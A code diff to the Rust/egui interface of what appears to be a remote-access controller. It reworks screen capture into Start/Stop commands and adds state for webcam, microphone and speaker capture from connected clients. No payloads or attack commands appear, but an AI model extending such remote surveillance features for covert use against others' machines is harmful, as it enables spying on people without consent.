@@ -1,9 +1,11 @@
 use crate::manager::types::UiManagerCommand;
 use egui::{
-    CollapsingHeader, Color32, ColorImage, Context, Frame, Id, Image, Margin, Stroke, Window,
+    CollapsingHeader, Color32, ColorImage, Context, Frame, Id, Image, Margin, Stroke,
+    TextureHandle, Window,
 };
-use shared::commands::{Command, ComputerInfoResponse, MessageBoxArgs};
-use std::time::Instant;
+use shared::commands::{
+    CaptureCommand, CaptureType, Command, ComputerInfoResponse, MessageBoxArgs,
+};
 use tokio::sync::mpsc::UnboundedSender;
 
 pub struct MsgboxView {
@@ -19,11 +21,35 @@ impl Default for MsgboxView {
     }
 }
 
+pub struct ClientViewCaptureState {
+    pub screen: bool,
+    pub webcam: bool,
+    pub mic: bool,
+    pub speaker: bool,
+}
+impl Default for ClientViewCaptureState {
+    fn default() -> Self {
+        Self {
+            screen: false,
+            webcam: false,
+            mic: false,
+            speaker: false,
+        }
+    }
+}
+pub struct ClientViewCaptures {
+    pub screen: Option<ColorImage>,
+    pub webcam: Option<ColorImage>,
+}
+pub struct ClientViewTextures {
+    pub screen: Option<TextureHandle>,
+    pub webcam: Option<TextureHandle>,
+}
 pub struct ClientViewState {
     pub visible: bool,
-    pub screen: Option<ColorImage>,
-    pub update_screen: bool,
-    pub last_screen: Option<Instant>,
+    pub captures: ClientViewCaptures,
+    pub textures: ClientViewTextures,
+    pub capturing: ClientViewCaptureState,
     pub msgbox: MsgboxView,
 }
 pub struct ClientView {
@@ -45,11 +71,15 @@ impl ClientView {
             socket: socket,
             state: ClientViewState {
                 visible: false,
-
-                screen: None,
-                update_screen: false,
-                last_screen: None,
-
+                captures: ClientViewCaptures {
+                    screen: None,
+                    webcam: None,
+                },
+                textures: ClientViewTextures {
+                    screen: None,
+                    webcam: None,
+                },
+                capturing: ClientViewCaptureState::default(),
                 msgbox: MsgboxView::default(),
             },
             // socket: socket,
@@ -71,66 +101,48 @@ pub fn render(ctx: &Context, view: &mut ClientView) {
                     CollapsingHeader::new("Screen")
                         .default_open(false)
                         .show(ui, |ui| {
-                            if let Some(ref image) = view.state.screen {
-                                let texture_handle = ui.ctx().load_texture(
-                                    format!("capture_{}", view.mutex),
-                                    image.clone(),
-                                    Default::default(),
-                                );
-                                let available_size = ui.available_size();
-                                let image_size = texture_handle.size_vec2();
-                                let max_width = available_size.x.min(720.0);
-                                let max_height = available_size.y.min(560.0);
-
-                                let scale_x = max_width / image_size.x;
-                                let scale_y = max_height / image_size.y;
-                                let scale = scale_x.min(scale_y).min(1.0);
-
-                                let display_size = image_size * scale;
-                                ui.add(Image::new(&texture_handle).max_size(display_size));
-                            } else {
-                                ui.label("Click 'Update' to load");
+                            if let Some(ref image) = view.state.captures.screen {
+                                if view.state.textures.screen.is_none() {
+                                    view.state.textures.screen = Some(ui.ctx().load_texture(
+                                        format!("capture_{}", view.mutex.clone()),
+                                        image.clone(),
+                                        Default::default(),
+                                    ));
+                                };
+                                if let Some(texture) = &view.state.textures.screen {
+                                    let available_size = ui.available_size();
+                                    let image_size = texture.size_vec2();
+                                    let max_width = available_size.x.min(720.0);
+                                    let max_height = available_size.y.min(560.0);
+                                    let scale_x = max_width / image_size.x;
+                                    let scale_y = max_height / image_size.y;
+                                    let scale = scale_x.min(scale_y).min(1.0);
+                                    let display_size = image_size * scale;
+                                    ui.add(Image::new(texture).max_size(display_size));
+                                }
                             }
 
-                            ui.horizontal(|ui| {
-                                if ui.button("Update").clicked() {
+                            if view.state.capturing.screen {
+                                if ui.button("Stop").clicked() {
+                                    println!("[*] sending CaptureCommand::Stop");
                                     let _ = view.sender.send(UiManagerCommand::SendCommand(
                                         view.mutex.clone(),
-                                        Command::Screenshot,
+                                        Command::Capture(CaptureCommand::Stop, CaptureType::Screen),
                                     ));
+                                    view.state.capturing.screen = false;
                                 }
-
-                                let checkbox = ui.checkbox(
-                                    &mut view.state.update_screen,
-                                    "Update automatically",
-                                );
-                                if checkbox.changed() {
-                                    if view.state.update_screen {
-                                        // just checked
-                                        let _ = view.sender.send(UiManagerCommand::SendCommand(
-                                            view.mutex.clone(),
-                                            Command::Screenshot,
-                                        ));
-                                        view.state.last_screen = Some(Instant::now());
-                                    } else {
-                                        // just unchecked
-                                        view.state.last_screen = None;
-                                    }
-                                }
-                            });
-
-                            if view.state.update_screen {
-                                if let Some(last_request_time) = view.state.last_screen {
-                                    if last_request_time.elapsed()
-                                        >= std::time::Duration::from_millis(400)
-                                    {
-                                        let _ = view.sender.send(UiManagerCommand::SendCommand(
-                                            view.mutex.clone(),
-                                            Command::Screenshot,
-                                        ));
-                                        view.state.last_screen = Some(Instant::now());
-                                    }
-                                }
+                            } else {
+                                if ui.button("Start").clicked() {
+                                    println!("[*] sending CaptureCommand::Start");
+                                    let _ = view.sender.send(UiManagerCommand::SendCommand(
+                                        view.mutex.clone(),
+                                        Command::Capture(
+                                            CaptureCommand::Start,
+                                            CaptureType::Screen,
+                                        ),
+                                    ));
+                                    view.state.capturing.screen = true;
+                                };
                             }
                         });
                 });
